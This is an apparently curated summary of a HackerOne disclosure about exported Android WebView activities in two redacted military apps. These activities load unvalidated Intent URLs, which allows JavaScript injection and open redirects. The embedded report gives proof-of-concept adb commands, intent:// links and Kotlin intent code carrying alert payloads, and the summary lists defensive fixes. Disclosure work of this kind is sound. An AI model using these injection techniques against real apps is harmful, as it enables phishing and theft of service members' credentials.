# Android WebView JavaScript Injection and Open Redirect via Exported Activities

## Metadata
- **Source:** HackerOne
- **Report:** 2555949 | https://hackerone.com/reports/2555949
- **Submitted:** 2024-06-17
- **Reporter:** cleanchain50
- **Program:** Military/Defense Android Applications (2 apps identified)
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Cross-Site Scripting (XSS), Open Redirect, Improper Input Validation, Exported Component Misconfiguration, Intent Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
Two Android military applications contain exported WebView activities that accept arbitrary URLs via Intent extras without validation, allowing attackers to execute JavaScript code or redirect users to malicious websites. The vulnerability stems from activities being marked as browsable and exported while directly loading user-supplied URL strings into WebView components without sanitization.

## Attack scenario
1. Attacker identifies exported WebviewActivity components in target Android applications via manifest analysis or reverse engineering
2. Attacker crafts malicious intent with javascript: protocol payload in URL extra parameter (e.g., 'javascript:alert(XSS)') or HTTPS URL to phishing site
3. Attacker delivers exploit via: (a) direct ADB command on compromised device, (b) intent:// URI scheme link in browser/email, or (c) malicious app with explicit component invocation
4. Victim's Android OS routes intent to exported WebviewActivity, which loads URL string directly into WebView without validation
5. JavaScript payload executes in WebView context with access to cookies, localStorage, and credentials, or user is redirected to attacker-controlled phishing page
6. Attacker steals session cookies, captures credentials from fake login form, or performs account takeover with potential lateral movement to other military applications

## Root cause
WebView activities are exported (android:exported='true') and marked as browsable, accepting unvalidated URL input via Intent extras. The application directly loads the user-supplied URL string into WebView without: (1) validating URL scheme, (2) filtering javascript: protocol, (3) disabling JavaScript execution, or (4) enforcing Content Security Policy headers.

## Attacker mindset
Opportunistic reconnaissance of military applications to identify low-hanging fruit in WebView implementations. Once discovered, the attacker realizes the ability to chain javascript: protocol execution with credential theft or phishing, recognizing this affects not just single apps but potentially entire military account ecosystems and other integrated defense systems.

## Defensive takeaways
- Never export WebView activities or explicitly validate intent origin before processing; use app-specific custom intent schemes instead of standard browsable handlers
- Implement strict URL validation: whitelist allowed schemes (http/https only), reject javascript:, data:, file: protocols using URL.parse() and scheme checking
- Disable JavaScript in WebView by default (webView.settings.javaScriptEnabled = false) unless absolutely required; if needed, use bridge pattern with explicit allowed methods
- Implement Content Security Policy headers (Content-Security-Policy: script-src 'self') to prevent inline script execution and restrict resource origins
- Use WebViewClient's shouldOverrideUrlLoading() to intercept and validate all URLs before loading, blocking dangerous schemes
- Apply input sanitization: encode/escape user input and use URI encoding for Intent extras
- Implement cryptographic intent signature verification for sensitive inter-app communication
- Conduct regular security audits of AndroidManifest.xml; use lint tools to flag exported components
- Educate developers on Android Intent security best practices and WebView security model limitations

## Variant hunting
Search for similar patterns: (1) Other exported Activity classes accepting URL/URI Intent extras without validation, (2) WebView implementations using loadUrl() with user input, (3) Custom URL scheme handlers that don't validate origin before processing, (4) Activities with action.VIEW intent filters combined with WebView usage, (5) Apps using deprecated WebView APIs like addJavascriptInterface() without proper security controls, (6) Intent filters with android:exported='true' on any Activity handling navigation

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application (Intent-based exploitation)
- T1598 - Phishing: Spearphishing Link (malicious intent:// URIs)
- T1589 - Gather Victim Identity Information (credential theft via XSS)
- T1570 - Lateral Tool Transfer (privilege escalation between military apps)
- T1566 - Phishing (malicious app or web link delivery)
- T1203 - Exploitation of Remote Services (WebView JavaScript execution)
- T1176 - Browser Extensions (WebView script injection parallel)

## Notes
Report targets military/defense applications, elevating severity due to potential nation-state impact and access to military personnel credentials. Vulnerability allows chaining of XSS + credential theft + lateral movement across integrated military systems. The use of multiple attack vectors (ADB, intent://, malicious app) demonstrates high accessibility. Redaction of app names and URLs suggests active defense coordination. No CVE assigned at report time. Mitigation requires both code-level fixes (input validation, scheme filtering) and manifest configuration changes (removing exported flag where unnecessary).

## Full report
<details><summary>Expand</summary>

**Description:**
Good afternoon,

I have discovered a misconfiguration in the WebView components of two apps, ████. This vulnerability allows an attacker to execute JavaScript and open any URL through a link or a malicious app.

The root cause of this issue is that certain activities are exported and set as browsable, exposing them to potential exploitation.
████████

## Impact

The potential impact of this vulnerability is high, as it allows an attacker to execute XSS within the WebView and open any HTTPS website. Possible attacks include phishing, creating fake login pages, and stealing service members' credentials. This could result in not only taking over ██████████ accounts but also potentially accessing other military applications and websites.

Additionally, the ability to execute JavaScript in these WebViews could enable attackers to steal cookies, further compromising user security.

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
**My Military One Source: **

adb shell am start -n ████/████████.kotlin.MVVM.Utils.Web.WebviewActivity --es URL "javascript:(function() { alert('XSS by Cleanchain') })();"

adb shell am start -n ████████/███.kotlin.MVVM.Utils.Web.WebviewActivity --es URL "https://URL"

Browser Example:

```
<body>
    <a href="intent://app/feedback#Intent;scheme=mymos;package=█████████;S.URL=javascript:(function() { alert('XSS by Cleanchain') })();end">Open XSS</a>

    <a href="intent://app/feedback#Intent;scheme=mymos;package=█████████;S.URL=https://URL;end">Open URL</a>

</body>
```


Malicious App Example:

```
val intent = Intent().apply {  
    setClassName("█████", "███████.kotlin.MVVM.Utils.Web.WebviewActivity")  
    putExtra("URL", "javascript:(function() { alert('XSS by Cleanchain') })()")  
}  
startActivity(intent)

val intent = Intent().apply {  
    setClassName("████", "██████.kotlin.MVVM.Utils.Web.WebviewActivity")  
    putExtra("URL", "https://URL")  
}  
startActivity(intent)
```


**Chill Drills:**

adb shell am start -n ██████████/███████.Utils.Web.WebviewActivity --es URL "javascript:(function() { alert('XSS by Cleanchain') })();"

adb shell am start -n ██████/█████████.Utils.Web.WebviewActivity --es URL "https://URL"

Browser Example:

```
<body>
    <a href="intent://app/feedback#Intent;scheme=chdr;package=██████████;S.URL=javascript:(function() { alert('XSS by Cleanchain') })();end">Open XSS - █████████</a>

    <a href="intent://app/feedback#Intent;scheme=chdr;package=███;S.URL=https://URL;end">Open URL - ███</a>

</body>
```


Malicious App Example:

```
val intent = Intent().apply {  
    setClassName("██████", "████████.Utils.Web.WebviewActivity")  
    putExtra("URL", "javascript:(function() { alert('XSS by Cleanchain') })()")  
}  
startActivity(intent)

val intent = Intent().apply {  
    setClassName("███████", "████████.Utils.Web.WebviewActivity")  
    putExtra("URL", "https://URL")  
}  
startActivity(intent)
```

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
